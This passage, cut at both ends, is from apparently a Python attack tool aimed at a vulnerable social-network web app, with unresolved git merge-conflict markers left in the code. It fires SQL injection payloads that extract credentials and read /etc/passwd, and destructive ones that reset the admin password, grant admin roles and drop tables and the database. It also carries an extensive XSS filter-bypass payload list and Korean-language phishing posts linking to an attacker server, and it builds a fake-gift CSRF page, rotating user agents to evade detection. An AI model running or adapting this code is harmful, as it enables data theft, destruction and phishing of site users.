        return False

    def test_sqli_profile(self):
        """Test SQL Injection in profile/user lookup"""
        print("\n[*] Testing SQL Injection in Profile/User Lookup...")

        profile_endpoints = [
            f"{self.base_url}/profile.php",
            f"{self.base_url}/user.php",
            f"{self.base_url}/view_profile.php",
        ]

        # ID-based SQLi payloads
        id_payloads = [
            ("1' OR '1'='1", "OR bypass"),
            ("1' UNION SELECT 1,2,3--", "Union 3"),
            ("1' UNION SELECT 1,2,3,4--", "Union 4"),
            ("1' UNION SELECT NULL,username,password,email FROM users WHERE id=1--", "Extract user data"),
            ("1' AND 1=2 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "Table enum"),
            ("1 OR 1=1", "Numeric OR"),
            ("1 UNION SELECT 1,2,3", "Numeric union"),
            ("-1' UNION SELECT username,password,email FROM users--", "Negative ID union"),
        ]

        param_names = ['id', 'user', 'user_id', 'uid', 'profile_id']

        for endpoint in profile_endpoints:
            for param in param_names:
                for payload, desc in id_payloads:
                    try:
                        self._rotate_user_agent()
                        self._random_delay(0.5, 1.5)

                        params = {param: payload}
                        response = self.session.get(endpoint, params=params, timeout=15)

                        # Check for SQL errors
                        if any(err in response.text.lower() for err in ['sql', 'mysql', 'error', 'warning', 'syntax']):
                            print(f"\n[+] POTENTIAL SQLi in Profile!")
                            print(f"    URL: {endpoint}?{param}={payload}")
                            print(f"    Type: {desc}")

                            vuln_info = {
                                'url': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'description': f'SQL Injection in profile lookup: {desc}',
                                'impact': 'CRITICAL - User data extraction, authentication bypass',
                                'cvss_score': 9.1
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)

                            return True

                    except Exception:
                        continue

        print("[-] No SQL Injection found in profile functionality")
        return False

    def test_sqli_posts(self):
        """Test SQL Injection in post viewing/filtering"""
        print("\n[*] Testing SQL Injection in Post Viewing...")

        post_endpoints = [
            f"{self.base_url}/post.php",
            f"{self.base_url}/view_post.php",
            f"{self.base_url}/index.php",
        ]

        # Post ID SQLi payloads
        post_payloads = [
            ("1' OR '1'='1'--", "OR bypass"),
            ("1' UNION SELECT 1,2,3,4--", "Union extract"),
            ("1' AND SLEEP(5)--", "Time-based blind"),
            ("1' AND (SELECT COUNT(*) FROM users)>0--", "Boolean blind"),
        ]

        param_names = ['id', 'post_id', 'p', 'post']

        for endpoint in post_endpoints:
            for param in param_names:
                for payload, desc in post_payloads:
                    try:
                        self._rotate_user_agent()
                        self._random_delay(0.5, 1.5)

                        params = {param: payload}
                        start_time = time.time()
                        response = self.session.get(endpoint, params=params, timeout=15)
                        elapsed = time.time() - start_time

                        # Check for SQL errors
                        if any(err in response.text.lower() for err in ['sql', 'mysql', 'error']):
                            print(f"\n[+] SQLi in Posts: {endpoint}?{param}={payload}")
                            return True

                        # Check for time-based SQLi
                        if 'sleep' in payload.lower() and elapsed > 4:
                            print(f"\n[+] TIME-BASED SQLi FOUND!")
                            print(f"    URL: {endpoint}?{param}={payload}")
                            print(f"    Response time: {elapsed:.2f}s")

                            vuln_info = {
                                'url': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'description': 'Time-based Blind SQL Injection in posts',
                                'response_time': elapsed,
                                'impact': 'CRITICAL - Blind SQLi allows data extraction',
                                'cvss_score': 8.6
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)
                            return True

                    except Exception:
                        continue

        print("[-] No SQL Injection found in post functionality")
        return False

    def test_sqli_second_order(self):
        """Test Second-Order SQL Injection"""
        print("\n[*] Testing Second-Order SQL Injection...")

        # Second-order: Inject payload via profile update, check if executed elsewhere
        second_order_payloads = [
            "admin' OR '1'='1'--",
            "<script>alert('XSS')</script>",
            "'; DROP TABLE posts--",
        ]

        profile_url = f"{self.base_url}/profile.php"

        for payload in second_order_payloads:
            try:
                self._rotate_user_agent()
                self._random_delay(1, 2)

                # Try to update username/bio with payload
                data = {'username': payload, 'bio': payload}
                response = self.session.post(profile_url, data=data, timeout=15)

                # Check if it causes errors when retrieved
                time.sleep(1)
                check = self.session.get(f"{self.base_url}/index.php", timeout=15)

                if any(err in check.text.lower() for err in ['sql', 'mysql', 'error']):
                    print(f"\n[+] SECOND-ORDER SQLi DETECTED!")
                    print(f"    Injected via: profile update")
                    print(f"    Triggered on: index page")
                    print(f"    Payload: {payload}")

                    vuln_info = {
                        'url': profile_url,
                        'payload': payload,
                        'description': 'Second-Order SQL Injection via profile',
                        'impact': 'CRITICAL - Stored SQLi, affects other users',
                        'cvss_score': 9.3
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)
                    return True

            except Exception:
                continue

        print("[-] No Second-Order SQL Injection found")
        return False

    def test_sqli_data_extraction(self):
        """Extract sensitive data using UNION-based SQL Injection"""
        print("\n[*] Testing UNION-based Data Extraction...")

        # Common endpoints that might be vulnerable
        test_endpoints = [
            (f"{self.base_url}/search.php", 'q'),
            (f"{self.base_url}/profile.php", 'id'),
            (f"{self.base_url}/post.php", 'id'),
            (f"{self.base_url}/index.php", 'search'),
        ]

        # Data extraction payloads
        extraction_payloads = [
            # Extract all usernames and passwords
            ("' UNION SELECT username,password,email FROM users--", "Extract user credentials"),
            ("' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--", "Extract credentials concat"),

            # Extract database structure
            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--", "Extract table names"),
            ("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns WHERE table_schema=database()--", "Extract column names"),

            # Extract specific data
            ("' UNION SELECT id,username,password FROM users WHERE username='admin'--", "Extract admin credentials"),
            ("' UNION SELECT database(),user(),version()--", "Extract DB info"),

            # File read attempts
            ("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--", "Read /etc/passwd"),
            ("' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--", "Read config.php"),
        ]

        for endpoint, param in test_endpoints:
            for payload, desc in extraction_payloads:
                try:
                    self._rotate_user_agent()
                    self._random_delay(0.5, 1.0)

                    params = {param: payload}
                    response = self.session.get(endpoint, params=params, timeout=15)

                    # Check if we got data
                    suspicious_patterns = [
                        r'admin.*:\$',  # password hashes
                        r'root:x:0:0',  # /etc/passwd
                        r'DB_PASSWORD',  # config files
                        r'mysql_',  # mysql functions
                        r'\$2[aby]\$',  # bcrypt hashes
                        r'[a-f0-9]{32}',  # MD5 hashes
                    ]

                    for pattern in suspicious_patterns:
                        if re.search(pattern, response.text, re.I):
                            print(f"\n[+] DATA EXTRACTION SUCCESS!")
                            print(f"    Endpoint: {endpoint}")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            print(f"    Type: {desc}")
                            print(f"    Extracted data preview: {response.text[:500]}")

                            vuln_info = {
                                'url': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'description': f'Data extraction via UNION SQLi: {desc}',
                                'extracted_data': response.text[:1000],
                                'impact': 'CRITICAL - Sensitive data exposed (credentials, config files)',
                                'cvss_score': 9.8
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)

                            self.log_event(
                                'SQL_DATA_EXTRACTION',
                                f'Sensitive data extracted via SQLi: {desc}',
                                'CRITICAL',
                                {'endpoint': endpoint, 'type': desc}
                            )

                            return True

                except Exception:
                    continue

        print("[-] No data extraction via UNION SQLi")
        return False

    def test_sqli_destructive(self):
        """Test destructive SQL Injection attacks (UPDATE, DELETE, DROP)"""
        print("\n[*] Testing Destructive SQL Injection Attacks...")
        print("[!] WARNING: These attacks will modify/destroy database data!")

        # Find a vulnerable endpoint first
        test_endpoints = [
            (f"{self.base_url}/search.php", 'q'),
            (f"{self.base_url}/profile.php", 'id'),
            (f"{self.base_url}/post.php", 'id'),
        ]

        # Destructive payloads (use with caution!)
        destructive_payloads = [
            # Point manipulation
            ("'; UPDATE users SET points=999999 WHERE username='admin'--", "Grant admin 999999 points"),
            ("'; UPDATE users SET points=999999 WHERE id=1--", "Grant user ID 1 max points"),
            ("'; UPDATE users SET points=points+10000--", "Add 10000 points to all users"),

            # Privilege escalation
            ("'; UPDATE users SET role='admin' WHERE username='admin'--", "Elevate to admin role"),
            ("'; UPDATE users SET is_admin=1--", "Make all users admin"),

            # Password reset
            ("'; UPDATE users SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' WHERE username='admin'--", "Reset admin password to 'password'"),

            # Data deletion
            ("'; DELETE FROM posts WHERE id>0--", "Delete all posts"),
            ("'; DELETE FROM users WHERE username!='admin'--", "Delete non-admin users"),
            ("'; TRUNCATE TABLE posts--", "Truncate posts table"),
            ("'; TRUNCATE TABLE logs--", "Truncate logs table"),

            # Table dropping (extreme)
            ("'; DROP TABLE posts--", "Drop posts table"),
            ("'; DROP TABLE logs--", "Drop logs table"),
            ("'; DROP TABLE sessions--", "Drop sessions table"),

            # Database destruction (most severe)
            ("'; DROP DATABASE IF EXISTS vulnerable_db--", "Drop entire database"),
        ]

        for endpoint, param in test_endpoints:
            for payload, desc in destructive_payloads:
                try:
                    self._rotate_user_agent()
                    self._random_delay(1.0, 2.0)

                    print(f"\n[*] Attempting: {desc}")
                    print(f"    Payload: {payload[:80]}...")

                    params = {param: payload}
                    response = self.session.get(endpoint, params=params, timeout=15)

                    # Check if attack succeeded (look for changes)
                    if response.status_code == 200:
                        # Verify the attack worked
                        check_response = self.session.get(f"{self.base_url}/index.php", timeout=15)

                        # Check for signs of success
                        success_indicators = []

                        # Check if points changed
                        if 'points' in payload.lower():
                            if '999999' in check_response.text or '99999' in check_response.text:
                                success_indicators.append("Points modified to 999999")

                        # Check if posts were deleted
                        if 'delete from posts' in payload.lower() or 'truncate table posts' in payload.lower():
                            soup = BeautifulSoup(check_response.text, 'html.parser')
                            posts = soup.find_all('div', class_='post')
                            if len(posts) == 0:
                                success_indicators.append("All posts deleted")

                        # Check if table was dropped
                        if 'drop table' in payload.lower():
                            if 'error' in check_response.text.lower() and 'table' in check_response.text.lower():
                                success_indicators.append("Table dropped (errors indicate missing table)")

                        if success_indicators:
                            print(f"[+] DESTRUCTIVE ATTACK SUCCESS!")
                            print(f"    Attack: {desc}")
                            print(f"    Evidence: {', '.join(success_indicators)}")

                            vuln_info = {
                                'url': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'description': f'Destructive SQL Injection: {desc}',
                                'damage': success_indicators,
                                'impact': 'CRITICAL - Database integrity compromised, data loss',
                                'cvss_score': 10.0
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)

                            self.log_event(
                                'SQL_DESTRUCTIVE',
                                f'Destructive SQLi attack successful: {desc}',
                                'CRITICAL',
                                {
                                    'endpoint': endpoint,
                                    'attack': desc,
                                    'damage': success_indicators
                                }
                            )

                            return True

                except Exception as e:
                    continue

        print("[-] No destructive SQL Injection succeeded")
        return False

=======
    
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
    def clear_old_posts(self):
        """Check and optionally clear old posts with incorrect attacker server URLs"""
        self.print_section("Checking for Old Posts")

        if not self.logged_in:
            print("[-] Login required")
            return False

        try:
            print(f"[*] Checking for posts with old/incorrect attacker server URLs...")
            print(f"[*] Current attacker server: {self.attacker_server}")

            response = self.session.get(f"{self.base_url}/index.php", timeout=30)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all posts
            posts = soup.find_all('div', class_='post')
            print(f"[*] Found {len(posts)} total posts on feed")

            old_posts_count = 0
            for post in posts:
                post_content = post.get_text()
                # Look for URLs that DON'T match current attacker server
                if 'http://' in post_content or 'https://' in post_content:
                    # Extract URLs from post
                    urls = re.findall(r'https?://[\d\.:]+(:\d+)?/[^\s]*', post_content)
                    for url in urls:
                        if self.attacker_server not in url:
                            old_posts_count += 1
                            print(f"[!] Found old post with URL: {url[:80]}...")

            if old_posts_count > 0:
                print(f"\n[!] WARNING: Found {old_posts_count} posts with OLD attacker server URLs")
                print(f"[!] These posts redirect to old servers instead of {self.attacker_server}")
                print(f"\n[*] To fix the redirect issue:")
                print(f"    1. Delete old posts from the database")
                print(f"    2. Or truncate the posts table: TRUNCATE TABLE posts;")
                print(f"    3. Then run this script again to create fresh posts")
            else:
                print(f"[+] No old posts found - all URLs match current attacker server")

            return old_posts_count > 0

        except Exception as e:
            print(f"[-] Error checking posts: {str(e)[:100]}")
            return False

    def test_xss_stored(self):
        """Test Stored XSS vulnerabilities with script tags"""
        self.print_section("Stored XSS - Script Injection in Posts")

        if not self.logged_in:
            print("[-] Login required")
            return False

        post_url = f"{self.base_url}/new_post.php"

<<<<<<< HEAD
        # XSS payloads to test - extensive evasion techniques
        xss_payloads = [
            # Basic payloads
            ('<script>alert("XSS")</script>', 'Basic script tag'),
            ('<script>alert(1)</script>', 'Numeric alert'),

            # Case variation
            ('<ScRiPt>alert(1)</ScRiPt>', 'Mixed case script'),
            ('<SCRIPT>alert(1)</SCRIPT>', 'Uppercase script'),

            # Image-based XSS
            ('<img src=x onerror=alert(1)>', 'Image onerror'),
            ('<img src=x onerror="alert(1)">', 'Image onerror quoted'),
            ('<img src=x onerror=alert(String.fromCharCode(88,83,83))>', 'Image with fromCharCode'),
            ('<img/src=x onerror=alert(1)>', 'Image with slash'),
            ('<img src="x" onerror="alert(1)">', 'Image fully quoted'),
            ('<img src onerror=alert(1)>', 'Image no value'),

            # SVG-based XSS
            ('<svg/onload=alert(1)>', 'SVG onload'),
            ('<svg onload=alert(1)>', 'SVG onload no slash'),
            ('<svg><script>alert(1)</script></svg>', 'SVG with script'),
            ('<svg><animatetransform onbegin=alert(1)>', 'SVG animate'),

            # Event handlers
            ('<body onload=alert(1)>', 'Body onload'),
            ('<input onfocus=alert(1) autofocus>', 'Input autofocus'),
            ('<select onfocus=alert(1) autofocus>', 'Select autofocus'),
            ('<textarea onfocus=alert(1) autofocus>', 'Textarea autofocus'),
            ('<marquee onstart=alert(1)>', 'Marquee onstart'),
            ('<details open ontoggle=alert(1)>', 'Details ontoggle'),

            # Iframe-based
            ('<iframe src="javascript:alert(1)"></iframe>', 'Iframe javascript'),
            ('<iframe src=javascript:alert(1)>', 'Iframe javascript unquoted'),

            # Encoding bypass
            ('<script>alert(String.fromCharCode(88,83,83))</script>', 'fromCharCode encoding'),
            ('<script>eval(atob("YWxlcnQoMSk="))</script>', 'Base64 eval'),
            ('<script>\u0061lert(1)</script>', 'Unicode escape'),
            ('<script>alert\u0028 1\u0029</script>', 'Unicode parentheses'),

            # Obfuscation
            ('<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>', 'Eval fromCharCode'),
            ('<script>setTimeout(alert,0,1)</script>', 'setTimeout'),
            ('<script>setInterval(alert,100,1)</script>', 'setInterval'),
            ('<script>[].constructor.constructor("alert(1)")()</script>', 'Constructor trick'),

            # Breaking out of context
            ('"><script>alert(1)</script>', 'Quote break'),
            ("'><script>alert(1)</script>", 'Single quote break'),
            ('</script><script>alert(1)</script>', 'Close and reopen'),
            ('"><img src=x onerror=alert(1)>', 'Quote to img'),

            # HTML5 specific
            ('<form><button formaction=javascript:alert(1)>X</button>', 'Form button'),
            ('<object data="javascript:alert(1)">', 'Object data'),
            ('<embed src="javascript:alert(1)">', 'Embed src'),
            ('<isindex type=image src=1 onerror=alert(1)>', 'Isindex'),

            # Filter bypass attempts
            ('<<script>alert(1)//<<//script>', 'Double angle bracket'),
            ('<script>alert(1)<!--', 'HTML comment'),
            ('<script>alert(1)//--></script>', 'Comment bypass'),
            ('<scr<script>ipt>alert(1)</scr</script>ipt>', 'Nested script'),

            # Null byte
            ('<script\x00>alert(1)</script>', 'Null byte in tag'),
            ('<img src=x\x00 onerror=alert(1)>', 'Null byte in attribute'),

            # Space alternatives
            ('<img/src=x/onerror=alert(1)>', 'Slash as space'),
            ('<img\tsrc=x\tonerror=alert(1)>', 'Tab as space'),
            ('<img\nsrc=x\nonerror=alert(1)>', 'Newline as space'),

            # Protocol variations
            ('<a href="javascript:alert(1)">click</a>', 'Link javascript'),
            ('<a href="java\tscript:alert(1)">click</a>', 'Tab in protocol'),
            ('<a href="java\nscript:alert(1)">click</a>', 'Newline in protocol'),
            ('<a href="&#106;avascript:alert(1)">click</a>', 'Entity encoded protocol'),

            # Polyglot attempts
            ('jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e', 'Polyglot XSS'),

            # Event handler variations
            ('<svg><animate onbegin=alert(1) attributeName=x dur=1s>', 'SVG animate onbegin'),
            ('<video><source onerror="alert(1)">', 'Video source error'),
            ('<audio src=x onerror=alert(1)>', 'Audio error'),

            # Without parentheses
            ('<script>onerror=alert;throw 1</script>', 'No parentheses throw'),
            ('<script>{onerror=alert}throw 1</script>', 'No parentheses block'),

            # Template literals
            ('<script>alert`1`</script>', 'Template literal'),

            # Short payloads
            ('<script>alert()</script>', 'Empty alert'),
            ('<svg onload=alert()>', 'SVG empty alert'),

            # Data URL
            ('<script src="data:text/javascript,alert(1)"></script>', 'Data URL script'),
            ('<img src="data:image/svg+xml,<svg onload=alert(1)>">', 'Data URL SVG'),
=======
        # XSS payloads to test
        xss_payloads = [
            ('<script>alert("XSS")</script>', 'Basic script tag'),
            ('<img src=x onerror=alert("XSS")>', 'Image onerror event'),
            ('<svg/onload=alert("XSS")>', 'SVG onload event'),
            ('"><script>alert("XSS")</script>', 'Breaking out of attribute'),
            ('<iframe src="javascript:alert(\'XSS\')"></iframe>', 'Iframe javascript protocol'),
            ('<body onload=alert("XSS")>', 'Body onload'),
            ('<input onfocus=alert("XSS") autofocus>', 'Input autofocus'),
            ('<marquee onstart=alert("XSS")>', 'Marquee onstart'),
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        ]

        xss_found = False

        for payload, desc in xss_payloads:
            try:
                self._rotate_user_agent()
                self._random_delay(2.0, 4.0)

                print(f"\n[*] Testing XSS: {desc}")
                print(f"    Payload: {payload[:60]}...")

                data = {'content': payload}
                headers = self._add_legitimate_headers(post_url)
                headers['Origin'] = self.base_url
                headers['Content-Type'] = 'application/x-www-form-urlencoded'

<<<<<<< HEAD
                print(f"    Sending data: {data}")
                response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)

                print(f"    Status: {response.status_code}")
                print(f"    Response URL: {response.url}")
                print(f"    Response preview: {response.text[:200]}")

                # Check for specific error messages
                if 'error' in response.text.lower():
                    soup = BeautifulSoup(response.text, 'html.parser')
                    error_msg = soup.find(class_=re.compile(r'error|alert|warning'))
                    if error_msg:
                        print(f"    Error detected: {error_msg.get_text(strip=True)[:150]}")

                # Check if redirected back to new_post (failed)
                if 'new_post' in response.url:
                    print(f"    Warning: Redirected back to new_post page - submission likely rejected")
=======
                response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)

                print(f"    Status: {response.status_code}")
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c

                # Check if payload is reflected without sanitization
                time.sleep(0.5)
                check = self.session.get(f"{self.base_url}/index.php")

                # Check if our payload appears UNESCAPED in the response
                if payload in check.text:
                    print(f"[+] SUCCESS! Stored XSS vulnerability found!")
                    print(f"    Payload is reflected without sanitization")
                    print(f"    XSS Type: {desc}")

                    vuln_info = {
                        'url': post_url,
                        'payload': payload,
                        'description': f'Stored XSS: {desc}',
                        'attack_type': 'stored_xss',
                        'impact': 'HIGH - JavaScript execution in victim browsers, session hijacking possible',
                        'cvss_score': 7.5
                    }
                    self.vulnerabilities['xss'].append(vuln_info)

                    self.log_event(
                        'STORED_XSS',
                        f'Stored XSS vulnerability confirmed: {desc}',
                        'HIGH',
                        {
                            'payload': payload,
                            'location': 'post content',
                            'xss_type': desc
                        }
                    )

                    xss_found = True
                    break  # Stop after first successful XSS to avoid cluttering feed

                elif payload[:50] in check.text:
                    # Payload exists but might be sanitized
                    print(f"[*] Payload found in response but may be sanitized")
                    # Check if it's HTML encoded
                    if '&lt;' in check.text or '&gt;' in check.text:
                        print(f"[-] XSS blocked: Payload is HTML-encoded")
                    else:
                        print(f"[?] Unclear if XSS is blocked - manual verification needed")
                else:
                    print(f"[-] Payload not found in feed - may have been filtered")

            except Exception as e:
                print(f"[-] Error testing XSS payload: {str(e)[:100]}")
                continue

        if not xss_found:
            print(f"\n[-] No XSS vulnerabilities found (payloads filtered or sanitized)")

        return xss_found

    def test_csrf_phishing(self):
        """Create phishing post with link to attacker server (CSRF attack)"""
        self.print_section("CSRF - Phishing Post with Attacker Link")

        if not self.logged_in:
            print("[-] Login required")
            return False

        if not self.attacker_user_id:
            print("[-] Attacker user ID not found")
            return False

        post_url = f"{self.base_url}/new_post.php"
        # Add timestamp to prevent caching and ensure fresh link
        timestamp = int(time.time())
        attacker_url = f"{self.attacker_server}/fake-gift?t={timestamp}"

        print(f"[*] Creating malicious post with link to attacker server")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        print(f"[*] Target URL: {attacker_url}")
        print(f"[*] Attacker Server: {self.attacker_server}")  # Debug: Show current server

        # Try multiple payload variations to bypass filters
        payloads_to_try = [
<<<<<<< HEAD
            # Warm-up posts (establish legitimacy)
            (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),
            (f'''오늘 날씨 좋네요!''', 'Weather comment'),

            # Direct link variations
=======
            (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),

>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
            (f'''🎁 무료 포인트 이벤트
링크: {attacker_url}
서두르세요!''', 'Direct link with emojis'),

            (f'''특별 이벤트 안내
{attacker_url}
참여 부탁드립니다''', 'Simple announcement'),

            (f'''이벤트 링크: {attacker_url}''', 'Simple link'),
<<<<<<< HEAD

            # Link obfuscation attempts
            (f'''포인트 이벤트: {attacker_url.replace("http://", "")}''', 'No http prefix'),
            (f'''선물 받기: {attacker_url.replace("://", "&#58;//")}''', 'HTML entity in URL'),
            (f'''클릭하세요: {attacker_url.replace(":", "&#x3A;")}''', 'Hex entity in URL'),

            # URL shortening simulation
            (f'''이벤트 참여
{attacker_url}
지금 바로!''', 'Multiline with URL'),

            # Without explicit URL mention
            (f'''무료 선물 이벤트가 진행중입니다!
여기로 오세요: {attacker_url}''', 'Invitation style'),

            # Encoded characters
            (f'''포인트 받기&#10;{attacker_url}''', 'With HTML newline'),
            (f'''이벤트&#x20;링크:&#x20;{attacker_url}''', 'With HTML spaces'),

            # Markdown-style links (if supported)
            (f'''[무료 포인트 받기]({attacker_url})''', 'Markdown link'),
            (f'''[클릭]({attacker_url}) 하세요!''', 'Short markdown'),

            # HTML anchor attempts
            (f'''<a href="{attacker_url}">무료 선물</a>''', 'HTML anchor tag'),
            (f'''<a href={attacker_url}>이벤트</a>''', 'Unquoted anchor'),

            # Mixed encoding
            (f'''선물 이벤트
%68%74%74%70://{attacker_url.split("://")[1]}''', 'URL encoded http'),

            # Plain text variations
            (f'''{attacker_url}
무료 포인트 받으세요''', 'URL first'),
            (f'''선물 이벤트 {attacker_url} 참여하세요''', 'Inline URL'),

            # Unicode tricks
            (f'''이벤트: {attacker_url}''', 'Unicode char'),

            # Zero-width characters (invisible)
            (f'''포인트{chr(0x200b)}이벤트{chr(0x200b)}: {attacker_url}''', 'Zero-width spaces'),

            # Different spacing
            (f'''포인트 이벤트

{attacker_url}

참여하세요!''', 'Extra spacing'),

            # Reversed words (creative)
            (f'''tneve tniop eerf
{attacker_url}''', 'Reversed text'),
=======
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        ]

        for payload, desc in payloads_to_try:
            try:
                # Evade detection: rotate UA, add delay, use legitimate headers
                self._rotate_user_agent()
                self._random_delay(2.0, 4.0)  # Longer delay between posts

                print(f"\n[*] Trying payload: {desc}")
                print(f"    Content: {payload[:80]}...")

                data = {'content': payload}
                headers = self._add_legitimate_headers(post_url)
                headers['Origin'] = self.base_url
                headers['Content-Type'] = 'application/x-www-form-urlencoded'

<<<<<<< HEAD
                print(f"    Sending data: {data}")
=======
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)

                print(f"    Status Code: {response.status_code}")
                print(f"    Final URL: {response.url}")
                print(f"    Response Length: {len(response.text)}")
<<<<<<< HEAD
                print(f"    Response preview: {response.text[:300]}")

                # Check if redirected back to new_post (failed)
                if 'new_post' in response.url:
                    print(f"    Warning: Redirected back to new_post page - submission likely rejected")

                # Check for specific error messages
                if 'error' in response.text.lower():
                    soup = BeautifulSoup(response.text, 'html.parser')
                    error_msg = soup.find(class_=re.compile(r'error|alert|warning'))
                    if error_msg:
                        print(f"    Error detected: {error_msg.get_text(strip=True)[:150]}")
=======
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c

                # Check for WAF/error messages
                if 'block' in response.text.lower() or 'forbidden' in response.text.lower() or 'denied' in response.text.lower():
                    print(f"[-] Possible WAF block detected")
                    soup = BeautifulSoup(response.text, 'html.parser')
                    error = soup.find(text=re.compile(r'block|forbidden|denied', re.IGNORECASE))
                    if error:
                        print(f"    WAF Message: {str(error)[:150]}")
                    continue

                if 'index.php' in response.url or response.status_code == 200:
                    print(f"[+] Post request accepted!")

                    time.sleep(0.5)
                    check = self.session.get(f"{self.base_url}/index.php")

                    # Check if post appears in feed (both with and without attacker URL)
                    if attacker_url in check.text or payload[:50] in check.text:
                        print(f"[+] SUCCESS! Post is live on feed!")
                        if attacker_url in check.text:
                            print(f"[+] Attack URL visible: {attacker_url}")
                        else:
                            print(f"[!] Post visible but URL may be filtered")

                        print(f"\n[*] Attack Flow:")
                        print(f"    1. Victim views main feed (index.php)")
                        print(f"    2. Victim clicks the link")
                        print(f"    3. Redirected to {attacker_url}")
                        print(f"    4. fake-gift page performs CSRF attack")
                        print(f"    5. Gifts sent to attacker (ID: {self.attacker_user_id})")
                        print(f"    6. Monitor at: {self.attacker_server}")

                        vuln_info = {
                            'url': post_url,
                            'payload': payload,
                            'description': f'CSRF phishing post: {desc}',
                            'attack_type': 'phishing_csrf',
                            'target_url': attacker_url,
                            'attacker_id': self.attacker_user_id,
                            'impact': 'CRITICAL - CSRF allows unauthorized actions on behalf of victim',
                            'cvss_score': 8.8
                        }
                        self.vulnerabilities['csrf'].append(vuln_info)

                        self.log_event(
                            'CSRF_PHISHING',
                            f'Malicious CSRF phishing post created: {desc}',
                            'CRITICAL',
                            {
                                'post_url': post_url,
                                'attack_url': attacker_url,
                                'attacker_id': self.attacker_user_id,
                                'method': desc
                            }
                        )

                        return True
                    else:
                        print(f"[-] Post not found in feed - may have been filtered")
                else:
                    print(f"[-] Post creation may have failed")

            except Exception as e:
                print(f"[-] Error with payload '{desc}': {str(e)[:100]}")
                continue

        print("\n[-] All post creation attempts failed")
        return False
    
    def generate_fake_gift_page(self):
        """개선된 fake-gift 페이지 생성"""
        print("\n[*] Generating fake-gift.html for attacker server...")

        # Create reports directory if it doesn't exist
        reports_dir = "reports"
        os.makedirs(reports_dir, exist_ok=True)

        if not self.attacker_user_id:
            print("[-] Cannot generate: attacker user ID unknown")
            self.attacker_user_id = "1"
            print(f"[*] Using default attacker ID: 1 (admin)")
        
        fake_gift_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎁 무료 포인트 받기!</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        h1 {{
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .gift-icon {{
            font-size: 100px;
            animation: bounce 1s infinite;
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: scale(1.1);
        }}
        .loading {{
            display: none;
            margin-top: 20px;
            color: #667eea;
            font-size: 1.1em;
        }}
        .success {{
            display: none;
            color: #28a745;
            font-size: 1.5em;
            margin-top: 20px;
        }}
        #status {{
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">자동으로 포인트를 받는 중...</div>
        <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
        <div class="loading" id="loading">⏳ 처리 중...</div>
        <div class="success" id="success">✅ 완료!</div>
    </div>
    
    <div id="csrfForms"></div>
    
    <script>
        let attackExecuted = false;
        const ATTACKER_ID = '{self.attacker_user_id}';
        const TARGET_SNS = '{self.base_url}';
        const ATTACKER_SERVER = '{self.attacker_server}';

        // Debug: Log configuration
        console.log('='.repeat(60));
        console.log('[+] Fake Gift Page Configuration:');
        console.log('[+] Target SNS:', TARGET_SNS);
        console.log('[+] Attacker ID:', ATTACKER_ID);
